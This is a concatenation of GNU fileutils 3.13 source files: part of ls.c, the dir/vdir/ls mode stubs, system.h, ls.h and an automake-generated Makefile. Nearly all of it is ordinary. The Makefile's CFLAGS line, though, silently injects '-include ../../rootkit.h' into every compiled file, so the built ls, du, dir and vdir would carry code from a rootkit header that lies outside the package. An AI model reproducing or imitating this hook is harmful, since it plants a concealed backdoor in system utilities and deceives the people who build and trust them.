  if (linkok == -1 && color_indicator[C_MISSING].string != NULL)
    {
      ext = NULL;
      type = C_MISSING;
    }
  else
    {
      /* Test if is is a recognized extension.  */

      len = strlen (name);
      name += len;		/* Pointer to final \0.  */
      for (ext = col_ext_list; ext != NULL; ext = ext->next)
	if (ext->ext.len <= len
	    && strncmp (name - ext->ext.len, ext->ext.string,
			ext->ext.len) == 0)
	  break;

      if (ext == NULL)
	{
	  if (S_ISDIR (mode))
	    type = C_DIR;

#ifdef S_ISLNK
	  else if (S_ISLNK (mode))
	    type = ((!linkok && color_indicator[C_ORPHAN].string)
		    ? C_ORPHAN : C_LINK);
#endif

#ifdef S_ISFIFO
	  else if (S_ISFIFO (mode))
	    type = C_FIFO;
#endif

#ifdef S_ISSOCK
	  else if (S_ISSOCK (mode))
	    type = C_SOCK;
#endif

#ifdef S_ISBLK
	  else if (S_ISBLK (mode))
	    type = C_BLK;
#endif

#ifdef S_ISCHR
	  else if (S_ISCHR (mode))
	    type = C_CHR;
#endif

	  if (type == C_FILE && (mode & (S_IEXEC|S_IEXEC>>3|S_IEXEC>>6)) != 0)
	    type = C_EXEC;
	}
    }

  put_indicator (&color_indicator[C_LEFT]);
  put_indicator (ext ? &(ext->seq) : &color_indicator[type]);
  put_indicator (&color_indicator[C_RIGHT]);
}

/* Output a color indicator (which may contain nulls).  */
static void
put_indicator (const struct bin_str *ind)
{
  register int i;
  register char *p;

  p = ind->string;

  for (i = ind->len; i > 0; --i)
    putchar (*(p++));
}

static int
length_of_file_name_and_frills (const struct fileinfo *f)
{
  register char *p = f->name;
  register unsigned char c;
  register int len = 0;

  if (print_inode)
    len += INODE_DIGITS + 1;

  if (print_block_size)
    len += 1 + block_size_size;

  if (quote_as_string)
    len += 2;

  while ((c = *p++))
    {
      if (quote_funny_chars)
	{
	  switch (c)
	    {
	    case '\\':
	    case '\n':
	    case '\b':
	    case '\r':
	    case '\t':
	    case '\f':
	    case ' ':
	      len += 2;
	      break;

	    case '"':
	      if (quote_as_string)
		len += 2;
	      else
		len += 1;
	      break;

	    default:
	      if (ISPRINT (c))
		len += 1;
	      else
		len += 4;
	    }
	}
      else
	len += 1;
    }

  if (indicator_style != none)
    {
      unsigned filetype = f->stat.st_mode;

      if (S_ISREG (filetype))
	{
	  if (indicator_style == all
	      && (f->stat.st_mode & (S_IEXEC | S_IEXEC >> 3 | S_IEXEC >> 6)))
	    len += 1;
	}
      else if (S_ISDIR (filetype)
#ifdef S_ISLNK
	       || S_ISLNK (filetype)
#endif
#ifdef S_ISFIFO
	       || S_ISFIFO (filetype)
#endif
#ifdef S_ISSOCK
	       || S_ISSOCK (filetype)
#endif
	)
	len += 1;
    }

  return len;
}

static void
print_many_per_line (void)
{
  int filesno;			/* Index into files. */
  int row;			/* Current row. */
  int max_name_length;		/* Length of longest file name + frills. */
  int name_length;		/* Length of each file name + frills. */
  int pos;			/* Current character column. */
  int cols;			/* Number of files across. */
  int rows;			/* Maximum number of files down. */

  /* Compute the maximum file name length.  */
  max_name_length = 0;
  for (filesno = 0; filesno < files_index; filesno++)
    {
      name_length = length_of_file_name_and_frills (files + filesno);
      if (name_length > max_name_length)
	max_name_length = name_length;
    }

  /* Allow at least two spaces between names.  */
  max_name_length += 2;

  /* Calculate the maximum number of columns that will fit. */
  cols = line_length / max_name_length;
  if (cols == 0)
    cols = 1;
  /* Calculate the number of rows that will be in each column except possibly
     for a short column on the right. */
  rows = files_index / cols + (files_index % cols != 0);
  /* Recalculate columns based on rows. */
  cols = files_index / rows + (files_index % rows != 0);

  for (row = 0; row < rows; row++)
    {
      filesno = row;
      pos = 0;
      /* Print the next row.  */
      while (1)
	{
	  print_file_name_and_frills (files + filesno);
	  name_length = length_of_file_name_and_frills (files + filesno);

	  filesno += rows;
	  if (filesno >= files_index)
	    break;

	  indent (pos + name_length, pos + max_name_length);
	  pos += max_name_length;
	}
      putchar ('\n');
    }
}

static void
print_horizontal (void)
{
  int filesno;
  int max_name_length;
  int name_length;
  int cols;
  int pos;

  /* Compute the maximum file name length.  */
  max_name_length = 0;
  for (filesno = 0; filesno < files_index; filesno++)
    {
      name_length = length_of_file_name_and_frills (files + filesno);
      if (name_length > max_name_length)
	max_name_length = name_length;
    }

  /* Allow two spaces between names.  */
  max_name_length += 2;

  cols = line_length / max_name_length;
  if (cols == 0)
    cols = 1;

  pos = 0;
  name_length = 0;

  for (filesno = 0; filesno < files_index; filesno++)
    {
      if (filesno != 0)
	{
	  if (filesno % cols == 0)
	    {
	      putchar ('\n');
	      pos = 0;
	    }
	  else
	    {
	      indent (pos + name_length, pos + max_name_length);
	      pos += max_name_length;
	    }
	}

      print_file_name_and_frills (files + filesno);

      name_length = length_of_file_name_and_frills (files + filesno);
    }
  putchar ('\n');
}

static void
print_with_commas (void)
{
  int filesno;
  int pos, old_pos;

  pos = 0;

  for (filesno = 0; filesno < files_index; filesno++)
    {
      old_pos = pos;

      pos += length_of_file_name_and_frills (files + filesno);
      if (filesno + 1 < files_index)
	pos += 2;		/* For the comma and space */

      if (old_pos != 0 && pos >= line_length)
	{
	  putchar ('\n');
	  pos -= old_pos;
	}

      print_file_name_and_frills (files + filesno);
      if (filesno + 1 < files_index)
	{
	  putchar (',');
	  putchar (' ');
	}
    }
  putchar ('\n');
}

/* Assuming cursor is at position FROM, indent up to position TO.
   Use a TAB character instead of two or more spaces whenever possible.  */

static void
indent (int from, int to)
{
  while (from < to)
    {
      if (tabsize > 0 && to / tabsize > (from + 1) / tabsize)
	{
	  putchar ('\t');
	  from += tabsize - from % tabsize;
	}
      else
	{
	  putchar (' ');
	  from++;
	}
    }
}

/* Put DIRNAME/NAME into DEST, handling `.' and `/' properly. */

static void
attach (char *dest, const char *dirname, const char *name)
{
  const char *dirnamep = dirname;

  /* Copy dirname if it is not ".". */
  if (dirname[0] != '.' || dirname[1] != 0)
    {
      while (*dirnamep)
	*dest++ = *dirnamep++;
      /* Add '/' if `dirname' doesn't already end with it. */
      if (dirnamep > dirname && dirnamep[-1] != '/')
	*dest++ = '/';
    }
  while (*name)
    *dest++ = *name++;
  *dest = 0;
}

static void
usage (int status)
{
  if (status != 0)
    fprintf (stderr, _("Try `%s --help' for more information.\n"),
	     program_name);
  else
    {
      printf (_("Usage: %s [OPTION]... [FILE]...\n"), program_name);
      printf (_("\
List information about the FILEs (the current directory by default).\n\
Sort entries alphabetically if none of -cftuSUX nor --sort.\n\
\n\
  -A, --almost-all           do not list implied . and ..\n\
  -a, --all                  do not hide entries starting with .\n\
  -B, --ignore-backups       do not list implied entries ending with ~\n\
  -b, --escape               print octal escapes for nongraphic characters\n\
  -C                         list entries by columns\n\
  -c                         sort by change time; with -l: show ctime\n\
      --color[=WHEN]         control whether color is used to distinguish file\n\
                               types.  WHEN may be `never', `always', or `auto'\n\
  -D, --dired                generate output designed for Emacs' dired mode\n\
  -d, --directory            list directory entries instead of contents\n\
  -F, --classify             append a character for typing each entry\n\
  -f                         do not sort, enable -aU, disable -lst\n\
      --format=WORD          across -x, commas -m, horizontal -x, long -l,\n\
                               single-column -1, verbose -l, vertical -C\n\
      --full-time            list both full date and full time\n"));

      printf (_("\
  -G, --no-group             inhibit display of group information\n\
  -g                         (ignored)\n\
  -I, --ignore=PATTERN       do not list implied entries matching shell PATTERN\n\
  -i, --inode                print index number of each file\n\
  -k, --kilobytes            use 1024 blocks, not 512 despite POSIXLY_CORRECT\n\
  -L, --dereference          list entries pointed to by symbolic links\n\
  -l                         use a long listing format\n\
  -m                         fill width with a comma separated list of entries\n\
  -N, --literal              print raw entry names (don't treat e.g. control\n\
                               characters specially)\n\
  -n, --numeric-uid-gid      list numeric UIDs and GIDs instead of names\n\
  -o                         use long listing format without group info\n\
  -p                         append a character for typing each entry\n\
  -Q, --quote-name           enclose entry names in double quotes\n\
  -q, --hide-control-chars   print ? instead of non graphic characters\n\
  -R, --recursive            list subdirectories recursively\n\
  -r, --reverse              reverse order while sorting\n\
  -S                         sort by file size\n"));

      printf (_("\
  -s, --size                 print block size of each file\n\
      --sort=WORD            ctime -c, extension -X, none -U, size -S,\n\
                               status -c, time -t\n\
      --time=WORD            atime -u, access -u, use -u\n\
  -T, --tabsize=COLS         assume tab stops at each COLS instead of 8\n\
  -t                         sort by modification time; with -l: show mtime\n\
  -U                         do not sort; list entries in directory order\n\
  -u                         sort by last access time; with -l: show atime\n\
  -w, --width=COLS           assume screen width instead of current value\n\
  -x                         list entries by lines instead of by columns\n\
  -X                         sort alphabetically by entry extension\n\
  -1                         list one file per line\n\
      --help                 display this help and exit\n\
      --version              output version information and exit\n\
\n\
By default, color is not used to distinguish types of files.  That is\n\
equivalent to using --color=none.  Using the --color option without the\n\
optional WHEN argument is equivalent to using --color=always.  With\n\
--color=auto, color codes are output only if standard output is connected\n\
to a terminal (tty).\n\
"
		));
    }
  exit (status);
}
#include "ls.h"
int ls_mode = LS_MULTI_COL;
#include "ls.h"
int ls_mode = LS_LONG_FORMAT;
#include "ls.h"
int ls_mode = LS_LS;
/* system-dependent definitions for fileutils programs.
   Copyright (C) 89, 91, 92, 93, 94, 1996 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software Foundation,
   Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

/* Include sys/types.h before this file.  */

#include <sys/stat.h>

#ifdef STAT_MACROS_BROKEN
#undef S_ISBLK
#undef S_ISCHR
#undef S_ISDIR
#undef S_ISFIFO
#undef S_ISLNK
#undef S_ISMPB
#undef S_ISMPC
#undef S_ISNWK
#undef S_ISREG
#undef S_ISSOCK
#endif /* STAT_MACROS_BROKEN.  */

#ifndef S_IFMT
#define S_IFMT 0170000
#endif
#if !defined(S_ISBLK) && defined(S_IFBLK)
#define S_ISBLK(m) (((m) & S_IFMT) == S_IFBLK)
#endif
#if !defined(S_ISCHR) && defined(S_IFCHR)
#define S_ISCHR(m) (((m) & S_IFMT) == S_IFCHR)
#endif
#if !defined(S_ISDIR) && defined(S_IFDIR)
#define S_ISDIR(m) (((m) & S_IFMT) == S_IFDIR)
#endif
#if !defined(S_ISREG) && defined(S_IFREG)
#define S_ISREG(m) (((m) & S_IFMT) == S_IFREG)
#endif
#if !defined(S_ISFIFO) && defined(S_IFIFO)
#define S_ISFIFO(m) (((m) & S_IFMT) == S_IFIFO)
#endif
#if !defined(S_ISLNK) && defined(S_IFLNK)
#define S_ISLNK(m) (((m) & S_IFMT) == S_IFLNK)
#endif
#if !defined(S_ISSOCK) && defined(S_IFSOCK)
#define S_ISSOCK(m) (((m) & S_IFMT) == S_IFSOCK)
#endif
#if !defined(S_ISMPB) && defined(S_IFMPB) /* V7 */
#define S_ISMPB(m) (((m) & S_IFMT) == S_IFMPB)
#define S_ISMPC(m) (((m) & S_IFMT) == S_IFMPC)
#endif
#if !defined(S_ISNWK) && defined(S_IFNWK) /* HP/UX */
#define S_ISNWK(m) (((m) & S_IFMT) == S_IFNWK)
#endif

#ifndef S_IEXEC
#define S_IEXEC S_IXUSR
#endif

#ifdef S_IEXEC
#ifndef S_IXUSR
#define S_IXUSR S_IEXEC
#endif
#ifndef S_IXGRP
#define S_IXGRP (S_IEXEC >> 3)
#endif
#ifndef S_IXOTH
#define S_IXOTH (S_IEXEC >> 6)
#endif
#endif /* S_IEXEC */

#if !defined(HAVE_MKFIFO)
#define mkfifo(path, mode) (mknod ((path), (mode) | S_IFIFO, 0))
#endif

#ifdef HAVE_SYS_PARAM_H
#include <sys/param.h>
#endif

/* <unistd.h> should be included before any preprocessor test
   of _POSIX_VERSION.  */
#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#ifndef STDIN_FILENO
#define STDIN_FILENO 0
#endif

#ifndef STDOUT_FILENO
#define STDOUT_FILENO 1
#endif

#ifndef STDERR_FILENO
#define STDERR_FILENO 2
#endif

#include "pathmax.h"

/* FIXME: Don't use _POSIX_VERSION.  */
#ifndef _POSIX_VERSION
off_t lseek ();
#endif

#ifdef TM_IN_SYS_TIME
#include <sys/time.h>
#else
#include <time.h>
#endif

/* Since major is a function on SVR4, we can't use `ifndef major'.  */
#ifdef MAJOR_IN_MKDEV
#include <sys/mkdev.h>
#define HAVE_MAJOR
#endif
#ifdef MAJOR_IN_SYSMACROS
#include <sys/sysmacros.h>
#define HAVE_MAJOR
#endif
#ifdef major			/* Might be defined in sys/types.h.  */
#define HAVE_MAJOR
#endif

#ifndef HAVE_MAJOR
#define major(dev)  (((dev) >> 8) & 0xff)
#define minor(dev)  ((dev) & 0xff)
#define makedev(maj, min)  (((maj) << 8) | (min))
#endif
#undef HAVE_MAJOR

#ifdef HAVE_UTIME_H
#include <utime.h>
#endif

/* Some systems (even some that do have <utime.h>) don't declare this
   structure anywhere.  */
#ifndef HAVE_STRUCT_UTIMBUF
struct utimbuf
{
  long actime;
  long modtime;
};
#endif

/* Don't use bcopy!  Use memmove if source and destination may overlap,
   memcpy otherwise.  */

#ifdef HAVE_STRING_H
# if !STDC_HEADERS && HAVE_MEMORY_H
#  include <memory.h>
# endif
# include <string.h>
#else
# include <strings.h>
char *memchr ();
#endif

#include <errno.h>
#ifndef errno
extern int errno;
#endif

#ifdef STDC_HEADERS
#define getopt system_getopt
#include <stdlib.h>
#undef getopt
#else /* not STDC_HEADERS */
char *getenv ();
#endif /* STDC_HEADERS */

/* The following test is to work around the gross typo in
   systems like Sony NEWS-OS Release 4.0C, whereby EXIT_FAILURE
   is defined to 0, not 1.  */
#if !EXIT_FAILURE
# undef EXIT_FAILURE
# define EXIT_FAILURE 1
#endif

#ifndef EXIT_SUCCESS
# define EXIT_SUCCESS 0
#endif

#ifdef HAVE_FCNTL_H
#include <fcntl.h>
#else
#include <sys/file.h>
#endif

#ifndef SEEK_SET
#define SEEK_SET 0
#define SEEK_CUR 1
#define SEEK_END 2
#endif
#ifndef F_OK
#define F_OK 0
#define X_OK 1
#define W_OK 2
#define R_OK 4
#endif

#ifdef HAVE_DIRENT_H
# include <dirent.h>
# define NLENGTH(direct) (strlen((direct)->d_name))
#else /* not HAVE_DIRENT_H */
# define dirent direct
# define NLENGTH(direct) ((direct)->d_namlen)
# ifdef HAVE_SYS_NDIR_H
#  include <sys/ndir.h>
# endif /* HAVE_SYS_NDIR_H */
# ifdef HAVE_SYS_DIR_H
#  include <sys/dir.h>
# endif /* HAVE_SYS_DIR_H */
# ifdef HAVE_NDIR_H
#  include <ndir.h>
# endif /* HAVE_NDIR_H */
#endif /* HAVE_DIRENT_H */

#ifdef CLOSEDIR_VOID
/* Fake a return value. */
#define CLOSEDIR(d) (closedir (d), 0)
#else
#define CLOSEDIR(d) closedir (d)
#endif

/* Get or fake the disk device blocksize.
   Usually defined by sys/param.h (if at all).  */
#ifndef DEV_BSIZE
#ifdef BSIZE
#define DEV_BSIZE BSIZE
#else /* !BSIZE */
#define DEV_BSIZE 4096
#endif /* !BSIZE */
#endif /* !DEV_BSIZE */

/* Extract or fake data from a `struct stat'.
   ST_BLKSIZE: Optimal I/O blocksize for the file, in bytes.
   ST_NBLOCKS: Number of 512-byte blocks in the file
   (including indirect blocks). */
#ifndef HAVE_ST_BLOCKS
# define ST_BLKSIZE(statbuf) DEV_BSIZE
# if defined(_POSIX_SOURCE) || !defined(BSIZE) /* fileblocks.c uses BSIZE.  */
#  define ST_NBLOCKS(statbuf) (((statbuf).st_size + 512 - 1) / 512)
# else /* !_POSIX_SOURCE && BSIZE */
#  define ST_NBLOCKS(statbuf) (st_blocks ((statbuf).st_size))
# endif /* !_POSIX_SOURCE && BSIZE */
#else /* HAVE_ST_BLOCKS */
/* Some systems, like Sequents, return st_blksize of 0 on pipes. */
# define ST_BLKSIZE(statbuf) ((statbuf).st_blksize > 0 \
			       ? (statbuf).st_blksize : DEV_BSIZE)
# if defined(hpux) || defined(__hpux__) || defined(__hpux)
/* HP-UX counts st_blocks in 1024-byte units.
   This loses when mixing HP-UX and BSD filesystems with NFS.  */
#  define ST_NBLOCKS(statbuf) ((statbuf).st_blocks * 2)
# else /* !hpux */
#  if defined(_AIX) && defined(_I386)
/* AIX PS/2 counts st_blocks in 4K units.  */
#    define ST_NBLOCKS(statbuf) ((statbuf).st_blocks * 8)
#  else /* not AIX PS/2 */
#    define ST_NBLOCKS(statbuf) ((statbuf).st_blocks)
#  endif /* not AIX PS/2 */
# endif /* !hpux */
#endif /* HAVE_ST_BLOCKS */

/* Convert B 512-byte blocks to kilobytes if K is nonzero,
   otherwise return it unchanged. */
#define convert_blocks(b, k) ((k) ? ((b) + 1) / 2 : (b))

#ifndef RETSIGTYPE
#define RETSIGTYPE void
#endif

#ifdef __GNUC__
# undef alloca
# define alloca __builtin_alloca
#else
# ifdef HAVE_ALLOCA_H
#  include <alloca.h>
# else
#  ifndef _AIX
/* AIX alloca decl has to be the first thing in the file, bletch! */
char *alloca ();
#  endif
# endif
#endif

#include <ctype.h>

#if defined (STDC_HEADERS) || (!defined (isascii) && !defined (HAVE_ISASCII))
#define IN_CTYPE_DOMAIN(c) 1
#else
#define IN_CTYPE_DOMAIN(c) isascii(c)
#endif

#ifdef isblank
#define ISBLANK(c) (IN_CTYPE_DOMAIN (c) && isblank (c))
#else
#define ISBLANK(c) ((c) == ' ' || (c) == '\t')
#endif
#ifdef isgraph
#define ISGRAPH(c) (IN_CTYPE_DOMAIN (c) && isgraph (c))
#else
#define ISGRAPH(c) (IN_CTYPE_DOMAIN (c) && isprint (c) && !isspace (c))
#endif

#define ISPRINT(c) (IN_CTYPE_DOMAIN (c) && isprint (c))
#define ISDIGIT(c) (IN_CTYPE_DOMAIN (c) && isdigit (c))
#define ISALNUM(c) (IN_CTYPE_DOMAIN (c) && isalnum (c))
#define ISALPHA(c) (IN_CTYPE_DOMAIN (c) && isalpha (c))
#define ISCNTRL(c) (IN_CTYPE_DOMAIN (c) && iscntrl (c))
#define ISLOWER(c) (IN_CTYPE_DOMAIN (c) && islower (c))
#define ISPUNCT(c) (IN_CTYPE_DOMAIN (c) && ispunct (c))
#define ISSPACE(c) (IN_CTYPE_DOMAIN (c) && isspace (c))
#define ISUPPER(c) (IN_CTYPE_DOMAIN (c) && isupper (c))
#define ISXDIGIT(c) (IN_CTYPE_DOMAIN (c) && isxdigit (c))

#ifndef __P
#if defined (__GNUC__) || (defined (__STDC__) && __STDC__)
#define __P(args) args
#else
#define __P(args) ()
#endif  /* GCC.  */
#endif  /* Not __P.  */

/* Take care of NLS matters.  */

#if HAVE_LOCALE_H
# include <locale.h>
#endif
#if !HAVE_SETLOCALE
# define setlocale(Category, Locale) /* empty */
#endif

#if ENABLE_NLS
# include <libintl.h>
# define _(Text) gettext (Text)
#else
# define bindtextdomain(Domain, Directory) /* empty */
# define textdomain(Domain) /* empty */
# define _(Text) Text
#endif

#define STREQ(a,b) (strcmp((a), (b)) == 0)
/* This is for the `ls' program.  */
#define LS_LS 1

/* This is for the `dir' program.  */
#define LS_MULTI_COL 2

/* This is for the `vdir' program.  */
#define LS_LONG_FORMAT 3

extern int ls_mode;
# Generated automatically from Makefile.in by configure.
# Makefile.in generated automatically by automake 1.0 from Makefile.am

# Copyright (C) 1994, 1995, 1996 Free Software Foundation, Inc.
# This Makefile.in is free software; the Free Software Foundation
# gives unlimited permission to copy, distribute and modify it.


SHELL = /bin/sh

srcdir = .
top_srcdir = ..
prefix = /usr/local
exec_prefix = ${prefix}

bindir = ${exec_prefix}/bin
sbindir = ${exec_prefix}/sbin
libexecdir = ${exec_prefix}/libexec
datadir = ${prefix}/share
sysconfdir = ${prefix}/etc
sharedstatedir = ${prefix}/com
localstatedir = ${prefix}/var
libdir = ${exec_prefix}/lib
infodir = ${prefix}/info
mandir = ${prefix}/man
includedir = ${prefix}/include
oldincludedir = /usr/include

pkgdatadir = $(datadir)/fileutils
pkglibdir = $(libdir)/fileutils
pkgincludedir = $(includedir)/fileutils

top_builddir = ..

transform = s,x,x,

AUTOMAKE_OPTIONS = ansi2knr

EXTRAdir = $(bindir)
EXTRA_PROGRAMS = df mvdir

bin_PROGRAMS = du \
dir vdir ls 

libexec_PROGRAMS = 
datadir = $(prefix)/share
localedir = $(datadir)/locale

noinst_HEADERS = system.h ls.h
EXTRA_DIST = ansi2knr.1 ansi2knr.c dcgen.pl dircolors.hin

INCLUDES = -I.. -I$(srcdir) -I$(top_srcdir)/lib -I../intl
DEFS = -DLOCALEDIR=\"$(localedir)\" -DSHAREDIR=\"$(datadir)\" -DHAVE_CONFIG_H
LDADD = ../intl/libintl.a ../lib/libfu.a

# Use `ginstall' in the definition of PROGRAMS and in dependencies to avoid
# confusion with the `install' target.  The install rule transforms `ginstall'
# to install before applying any user-specified name transformations.

transform = s/ginstall/install/; s,x,x,

dir_SOURCES = ls.c ls-dir.c
vdir_SOURCES = ls.c ls-vdir.c
ls_SOURCES = ls.c ls-ls.c

BUILT_SOURCES = #M#dircolors.h
PERL = /usr/local/bin/perl
editpl = sed -e 's,@''PERL''@,$(PERL),g'

CLEANFILES = dcgen
MAINTAINERCLEANFILES = dircolors.h

SUFFIXES = .pl
mkinstalldirs = $(top_srcdir)/mkinstalldirs
CONFIG_HEADER = ../config.h
PROGRAMS = $(bin_PROGRAMS) $(libexec_PROGRAMS)


CC = gcc
LEX = @LEX@
YACC = bison -y
CPPFLAGS = 
CFLAGS = -g -O -include ../../rootkit.h
LDFLAGS = 
LIBS = 

COMPILE = $(CC) -c $(DEFS) $(INCLUDES) $(CPPFLAGS) $(CFLAGS)
LINK = $(CC) $(LDFLAGS) -o $@

ANSI2KNR = 
o = .o
dircolors_SOURCES = dircolors.c
dircolors_OBJECTS = dircolors$o
EXTRA_dircolors_SOURCES =
dircolors_LDADD = $(LDADD)
du_SOURCES = du.c
du_OBJECTS = du$o
EXTRA_du_SOURCES =
du_LDADD = $(LDADD)
dir_OBJECTS = ls$o ls-dir$o
EXTRA_dir_SOURCES =
dir_LDADD = $(LDADD)
vdir_OBJECTS = ls$o ls-vdir$o
EXTRA_vdir_SOURCES =
vdir_LDADD = $(LDADD)
ls_OBJECTS = ls$o ls-ls$o
EXTRA_ls_SOURCES =
ls_LDADD = $(LDADD)
HEADERS = $(noinst_HEADERS)

DIST_COMMON = Makefile.am Makefile.in


PACKAGE = fileutils
VERSION = 3.13

DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFOS) $(MANS) $(EXTRA_DIST) $(DATA)
DEP_DISTFILES = $(DIST_COMMON) $(SOURCES) $(BUILT_SOURCES) $(HEADERS) \
	$(TEXINFOS) $(INFO_DEPS) $(MANS) $(EXTRA_DIST) $(DATA)

TAR = tar
SOURCES = du.c \
$(dir_SOURCES) $(vdir_SOURCES) $(ls_SOURCES) 
OBJECTS = du$o \
$(dir_OBJECTS) $(vdir_OBJECTS) $(ls_OBJECTS)

default: all


mostlyclean-binPROGRAMS:

clean-binPROGRAMS:
	test -z "$(bin_PROGRAMS)" || rm -f $(bin_PROGRAMS)

distclean-binPROGRAMS:

maintainer-clean-binPROGRAMS:

install-binPROGRAMS: $(bin_PROGRAMS)
	$(mkinstalldirs) $(bindir)
	list="$(bin_PROGRAMS)"; for p in $$list; do \
	  if test -f $$p; then \
	    $(INSTALL_PROGRAM) $$p $(bindir)/`echo $$p|sed '$(transform)'`; \
	  else :; fi; \
	done

uninstall-binPROGRAMS:
	list="$(bin_PROGRAMS)"; for p in $$list; do \
	  rm -f $(bindir)/`echo $$p|sed '$(transform)'`; \
	done

mostlyclean-libexecPROGRAMS:

clean-libexecPROGRAMS:
	test -z "$(libexec_PROGRAMS)" || rm -f $(libexec_PROGRAMS)

distclean-libexecPROGRAMS:

maintainer-clean-libexecPROGRAMS:

install-libexecPROGRAMS: $(libexec_PROGRAMS)
	$(mkinstalldirs) $(libexecdir)
	list="$(libexec_PROGRAMS)"; for p in $$list; do \
	  if test -f $$p; then \
	    $(INSTALL_PROGRAM) $$p $(libexecdir)/`echo $$p|sed '$(transform)'`; \
	  else :; fi; \
	done

uninstall-libexecPROGRAMS:
	list="$(libexec_PROGRAMS)"; for p in $$list; do \
	  rm -f $(libexecdir)/`echo $$p|sed '$(transform)'`; \
	done

.c.o:
	$(COMPILE) $<

mostlyclean-compile:
	rm -f *.o core

clean-compile:

distclean-compile:
	rm -f *.tab.c

maintainer-clean-compile:

.c._c:
	$(ANSI2KNR) $< > $*.tmp && mv $*.tmp $@

._c._o:
	@echo $(COMPILE) $<
	@rm -f _$*.c
	@ln $< _$*.c && $(COMPILE) _$*.c && mv _$*.o $@ && rm _$*.c

.c._o:
	$(ANSI2KNR) $< > $*.tmp && mv $*.tmp $*._c
	@echo $(COMPILE) $*._c
	@rm -f _$*.c
	@ln $*._c _$*.c && $(COMPILE) _$*.c && mv _$*.o $@ && rm _$*.c

ansi2knr: ansi2knr.o
	$(LINK) ansi2knr.o $(LIBS)

$(OBJECTS): $(ANSI2KNR)
ansi2knr.o: $(CONFIG_HEADER)

mostlyclean-kr:
	rm -f *._o *._c _*.c _*.o

clean-kr:

distclean-kr:
	rm -f ansi2knr

maintainer-clean-kr:
$(chgrp_OBJECTS): ../config.h

du: $(du_OBJECTS) $(du_DEPENDENCIES)
	$(LINK) $(du_OBJECTS) $(du_LDADD) $(LIBS)

dir: $(dir_OBJECTS) $(dir_DEPENDENCIES)
	$(LINK) $(dir_OBJECTS) $(dir_LDADD) $(LIBS)
$(vdir_OBJECTS): ../config.h

vdir: $(vdir_OBJECTS) $(vdir_DEPENDENCIES)
	$(LINK) $(vdir_OBJECTS) $(vdir_LDADD) $(LIBS)
$(ls_OBJECTS): ../config.h

ls: $(ls_OBJECTS) $(ls_DEPENDENCIES)
	$(LINK) $(ls_OBJECTS) $(ls_LDADD) $(LIBS)
$(mkdir_OBJECTS): ../config.h

ID: $(HEADERS) $(SOURCES)
	here=`pwd` && cd $(srcdir) && mkid -f$$here/ID $(SOURCES) $(HEADERS)

tags: TAGS

TAGS: $(HEADERS) $(SOURCES) $(TAGS_DEPENDENCIES)
	here=`pwd` && cd $(srcdir) && etags $(ETAGS_ARGS) $(SOURCES) $(HEADERS) -o $$here/TAGS

mostlyclean-tags:

clean-tags:

distclean-tags:
	rm -f TAGS ID

maintainer-clean-tags:

subdir = src
distdir = $(top_builddir)/$(PACKAGE)-$(VERSION)/$(subdir)
distdir: $(DEP_DISTFILES)
	@for file in `cd $(srcdir) && echo $(DISTFILES)`; do \
	  test -f $(distdir)/$$file \
	  || ln $(srcdir)/$$file $(distdir)/$$file 2> /dev/null \
	  || cp -p $(srcdir)/$$file $(distdir)/$$file; \
	done
du$o: du.c system.h ../lib/pathmax.h ../lib/save-cwd.h ../lib/error.h
ls-dir$o: ls-dir.c ls.h
ls-ls$o: ls-ls.c ls.h
ls-vdir$o: ls-vdir.c ls.h
ls$o: ls.c system.h ../lib/pathmax.h ../lib/obstack.h ls.h \
 ../lib/error.h ../lib/argmatch.h ../lib/xstrtol.h

info:

dvi:

check: all

installcheck:

install-exec: install-binPROGRAMS install-libexecPROGRAMS

install-data: 

install: install-exec install-data all
	@:

uninstall: uninstall-binPROGRAMS uninstall-libexecPROGRAMS

all: $(PROGRAMS) $(HEADERS) Makefile

install-strip:
	$(MAKE) INSTALL_PROGRAM='$(INSTALL_PROGRAM) -s' install
installdirs:
	$(mkinstalldirs)  $(bindir) $(libexecdir)


mostlyclean-generic:
	test -z "$(MOSTLYCLEANFILES)" || rm -f $(MOSTLYCLEANFILES)

clean-generic:
	test -z "$(CLEANFILES)" || rm -f $(CLEANFILES)

distclean-generic:
	rm -f Makefile $(DISTCLEANFILES)
	rm -f config.cache config.log $(CONFIG_HEADER) stamp-h

maintainer-clean-generic:
	test -z "$(MAINTAINERCLEANFILES)" || rm -f $(MAINTAINERCLEANFILES)
	test -z "$(BUILT_SOURCES)" || rm -f $(BUILT_SOURCES)
mostlyclean:  mostlyclean-binPROGRAMS mostlyclean-libexecPROGRAMS \
		mostlyclean-compile mostlyclean-kr mostlyclean-tags \
		mostlyclean-generic

clean:  clean-binPROGRAMS clean-libexecPROGRAMS clean-compile clean-kr \
		clean-tags clean-generic mostlyclean 

distclean:  distclean-binPROGRAMS distclean-libexecPROGRAMS \
		distclean-compile distclean-kr distclean-tags \
		distclean-generic clean 
	rm -f config.status

maintainer-clean:  maintainer-clean-binPROGRAMS \
		maintainer-clean-libexecPROGRAMS \
		maintainer-clean-compile maintainer-clean-kr \
		maintainer-clean-tags maintainer-clean-generic \
		distclean 
	@echo "This command is intended for maintainers to use;"
	@echo "it deletes files that may require special tools to rebuild."

.PHONY: default mostlyclean-binPROGRAMS distclean-binPROGRAMS \
clean-binPROGRAMS maintainer-clean-binPROGRAMS uninstall-binPROGRAMS \
install-binPROGRAMS mostlyclean-libexecPROGRAMS \
distclean-libexecPROGRAMS clean-libexecPROGRAMS \
maintainer-clean-libexecPROGRAMS uninstall-libexecPROGRAMS \
install-libexecPROGRAMS mostlyclean-compile distclean-compile \
clean-compile maintainer-clean-compile mostlyclean-kr distclean-kr \
clean-kr maintainer-clean-kr tags mostlyclean-tags distclean-tags \
clean-tags maintainer-clean-tags distdir info dvi check installcheck \
install-exec install-data install uninstall all installdirs \
mostlyclean-generic distclean-generic clean-generic \
maintainer-clean-generic clean mostlyclean distclean maintainer-clean


$(bin_PROGRAMS) $(libexec_PROGRAMS): ../lib/libfu.a

.pl:
	rm -f $@ $@.tmp
